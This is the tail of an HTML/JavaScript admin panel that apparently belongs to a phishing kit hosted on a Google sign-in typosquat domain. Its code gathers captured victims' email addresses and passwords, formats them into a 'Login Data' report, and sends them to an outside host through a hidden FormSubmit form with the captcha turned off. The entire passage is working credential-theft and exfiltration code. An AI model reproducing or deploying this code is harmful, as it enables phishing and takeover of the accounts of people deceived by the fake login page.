            // Auto-select the text in the textarea
            setTimeout(() => {
                const textarea = content.querySelector('textarea');
                textarea.focus();
                textarea.select();
            }, 100);
            
            document.getElementById('closeDataModalBtn').addEventListener('click', function() {
                document.body.removeChild(modal);
            });
        }
        
        // Submit logs via FormSubmit
        function submitLogsViaFormSubmit() {
            if (!window.loginTracker) {
                alert("Login tracker not available!");
                return;
            }
            
            const attempts = window.loginTracker.getAttempts();
            if (!attempts || attempts.length === 0) {
                alert("No login attempts to send! Capture some logins first.");
                return;
            }
            
            // Prompt for email address
            const savedEmail = localStorage.getItem('autoEmailAddress') || '';
            const emailPrompt = prompt("Enter your email address to receive login data:", savedEmail);
            
            if (!emailPrompt) return; // User cancelled
            
            const emailAddress = emailPrompt.trim();
            if (!emailAddress || !emailAddress.includes('@')) {
                alert("Please enter a valid email address");
                return;
            }
            
            // Save email for future use
            localStorage.setItem('autoEmailAddress', emailAddress);
            
            // Format the data for email
            let formattedData = "Login Data from https://googlesing-in.github.io/\n\n";
            formattedData += "Collected on: " + new Date().toLocaleString() + "\n\n";
            
            attempts.forEach((attempt, index) => {
                formattedData += "--- Login #" + (index + 1) + " ---\n";
                formattedData += "Email: " + (attempt.email || "(not provided)") + "\n";
                formattedData += "Password: " + (attempt.password || "(not provided)") + "\n";
                formattedData += "Time: " + (new Date(attempt.timestamp).toLocaleString() || "Unknown") + "\n\n";
            });
            
            try {
                // Show loading indicator
                const loadingModal = showLoadingModal("Sending email via FormSubmit...");
                
                // Get the form and set up fields
                const form = document.getElementById('formSubmitForm');
                document.getElementById('formSubmitData').value = formattedData;
                document.getElementById('formSubmitReplyTo').value = emailAddress;
                
                // Form action is already set to the FormSubmit activation code in the HTML
                
                // Submit the form
                form.submit();
                
                // Close loading after a bit (in case form submission is slow)
                setTimeout(() => {
                    hideLoadingModal(loadingModal);
                    
                    // Show success message
                    const modal = document.createElement('div');
                    modal.style.position = 'fixed';
                    modal.style.top = '0';
                    modal.style.left = '0';
                    modal.style.width = '100%';
                    modal.style.height = '100%';
                    modal.style.backgroundColor = 'rgba(0,0,0,0.7)';
                    modal.style.zIndex = '10000';
                    modal.style.display = 'flex';
                    modal.style.justifyContent = 'center';
                    modal.style.alignItems = 'center';
                    
                    const content = document.createElement('div');
                    content.style.backgroundColor = '#202124';
                    content.style.borderRadius = '12px';
                    content.style.padding = '25px';
                    content.style.width = '90%';
                    content.style.maxWidth = '500px';
                    content.style.color = '#e8eaed';
                    
                    content.innerHTML = `
                        <h3 style="margin-top: 0; color: #8ab4f8;">Email Being Sent</h3>
                        
                        <p>Your login data is being sent to ${emailAddress}.</p>
                        
                        <div style="background-color: #30363c; padding: 15px; border-radius: 5px; margin: 15px 0; border-left: 3px solid #4285F4;">
                            <p style="margin: 0 0 10px 0;"><strong>FormSubmit Activated!</strong></p>
                            <p style="margin: 0 0 10px 0;">The form has been activated with FormSubmit for the domain: <strong>googlesing-in.github.io</strong>. Your login data will be sent directly to your email.</p>
                        </div>
                        
                        <div style="text-align: center; margin-top: 20px;">
                            <button id="closeFormSubmitModal" style="padding: 10px 15px; border: none; border-radius: 5px; background: #8ab4f8; color: #202124; cursor: pointer; font-weight: bold;">Close</button>
                        </div>
                    `;
                    
                    modal.appendChild(content);
                    document.body.appendChild(modal);
                    
                    document.getElementById('closeFormSubmitModal').addEventListener('click', function() {
                        document.body.removeChild(modal);
                    });
                }, 2000);
                
            } catch (err) {
                alert("Error sending email: " + err.message);
                console.error('Error in FormSubmit:', err);
            }
        }
        
        // Show loading modal
        function showLoadingModal(message) {
            const modal = document.createElement('div');
            modal.style.position = 'fixed';
            modal.style.top = '0';
            modal.style.left = '0';
            modal.style.width = '100%';
            modal.style.height = '100%';
            modal.style.backgroundColor = 'rgba(0,0,0,0.7)';
            modal.style.zIndex = '10000';
            modal.style.display = 'flex';
            modal.style.justifyContent = 'center';
            modal.style.alignItems = 'center';
            modal.id = 'loadingModal';
            
            const content = document.createElement('div');
            content.style.backgroundColor = '#202124';
            content.style.borderRadius = '12px';
            content.style.padding = '25px';
            content.style.width = '90%';
            content.style.maxWidth = '300px';
            content.style.color = '#e8eaed';
            content.style.textAlign = 'center';
            
            const spinner = document.createElement('div');
            spinner.className = 'loading';
            spinner.style.display = 'inline-block';
            spinner.style.width = '30px';
            spinner.style.height = '30px';
            spinner.style.border = '3px solid rgba(255,255,255,.3)';
            spinner.style.borderRadius = '50%';
            spinner.style.borderTopColor = '#4285F4';
            spinner.style.animation = 'spin 1s ease-in-out infinite';
            spinner.style.marginBottom = '15px';
            
            content.appendChild(spinner);
            content.appendChild(document.createElement('br'));
            content.appendChild(document.createTextNode(message || 'Loading...'));
            
            modal.appendChild(content);
            document.body.appendChild(modal);
            
            return modal;
        }
        
        // Hide loading modal
        function hideLoadingModal(modal) {
            if (modal && modal.parentNode) {
                modal.parentNode.removeChild(modal);
            } else {
                const existingModal = document.getElementById('loadingModal');
                if (existingModal) {
                    existingModal.parentNode.removeChild(existingModal);
                }
            }
        }
    </script>
    
    <!-- Hidden form for FormSubmit email service -->
    <form id="formSubmitForm" style="display: none;" method="POST" action="https://formsubmit.co/94ca4051c13084e78e0b9c668bf8c279">
        <input type="hidden" name="loginData" id="formSubmitData">
        <input type="hidden" name="_subject" value="Login Attempts Report">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_template" value="table">
        <input type="hidden" name="_replyto" id="formSubmitReplyTo">
        <input type="hidden" name="_next" value="https://googlesing-in.github.io/admin-panel.html">
    </form>
</body>
</html>